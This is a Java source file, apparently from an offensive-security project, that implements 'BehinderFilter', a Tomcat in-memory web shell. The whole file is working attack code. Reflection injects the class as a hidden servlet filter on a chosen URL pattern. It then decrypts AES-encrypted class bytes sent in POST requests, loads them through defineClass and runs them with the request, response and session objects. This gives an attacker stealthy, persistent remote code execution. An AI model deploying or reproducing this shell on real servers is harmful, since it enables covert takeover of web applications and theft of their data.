package org.erosion2020.memshell;


import java.lang.reflect.Field;

import org.apache.catalina.core.StandardContext;
import java.io.IOException;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;
import java.lang.reflect.Constructor;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.Context;

import javax.servlet.*;
import java.lang.reflect.Method;
import java.util.*;
import javax.crypto.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import javax.crypto.spec.SecretKeySpec;
import java.util.Base64;

public class BehinderFilter implements Filter {
    public static String name;
    public static String pattern;
    public static String password;

    static {
        try {
            final String urlPattern = pattern;

            WebappClassLoaderBase loader =
                    (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext context = (StandardContext) loader.getResources().getContext();

            Field filterConfigsField = findField(context.getClass(), "filterConfigs");
            filterConfigsField.setAccessible(true);
            @SuppressWarnings("unchecked")
            Map<String, ApplicationFilterConfig> filterConfigs =
                    (Map<String, ApplicationFilterConfig>) filterConfigsField.get(context);

            // 创建 Filter 对象和 FilterDef
            BehinderFilter filter = new BehinderFilter();
            FilterDef filterDef = new FilterDef();
            filterDef.setFilter(filter);
            filterDef.setFilterName(name);
            filterDef.setFilterClass(filter.getClass().getName());
            context.addFilterDef(filterDef);

            // 添加 Filter 映射
            FilterMap filterMap = new FilterMap();
            filterMap.addURLPattern(urlPattern);
            filterMap.setFilterName(name);
            filterMap.setDispatcher(DispatcherType.REQUEST.name());
            context.addFilterMapBefore(filterMap);

            // 构造 ApplicationFilterConfig 对象并注册
            Constructor<ApplicationFilterConfig> constructor =
                    ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
            constructor.setAccessible(true);
            ApplicationFilterConfig config = constructor.newInstance(context, filterDef);
            filterConfigs.put(name, config);

        } catch (Exception ignore) { }
    }

    private static Field findField(Class<?> clazz, String name) throws NoSuchFieldException {
        while (clazz != null) {
            try {
                return clazz.getDeclaredField(name);
            } catch (NoSuchFieldException ignored) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException("Field " + name + " not found.");
    }

    @Override
    public void init(FilterConfig filterConfig) { }

    @Override
    public void doFilter(
            ServletRequest request,
            ServletResponse response,
            FilterChain chain
    ) throws IOException, ServletException {
        try {
            HttpServletRequest req = (HttpServletRequest) request;
            HttpServletResponse resp = (HttpServletResponse) response;
            HttpSession session = req.getSession();

            if ("POST".equalsIgnoreCase(req.getMethod())) {
                String key = password;
                session.setAttribute("u", key); // putValue 已废弃

                Cipher cipher = Cipher.getInstance("AES");
                cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key.getBytes(), "AES"));

                String line = req.getReader().readLine();
                byte[] classBytes = cipher.doFinal(Base64.getDecoder().decode(line));

                Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                defineClass.setAccessible(true);
                Class<?> evilClass = (Class<?>) defineClass.invoke(
                        this.getClass().getClassLoader(),
                        classBytes, 0, classBytes.length
                );

                Map<String, Object> pageContext = new HashMap<>();
                pageContext.put("request", req);
                pageContext.put("response", resp);
                pageContext.put("session", session);

                evilClass.getDeclaredConstructor().newInstance().equals(pageContext);
            }

        } catch (Exception e) { e.printStackTrace(); }

        chain.doFilter(request, response);
    }

    @Override
    public void destroy() {}

}



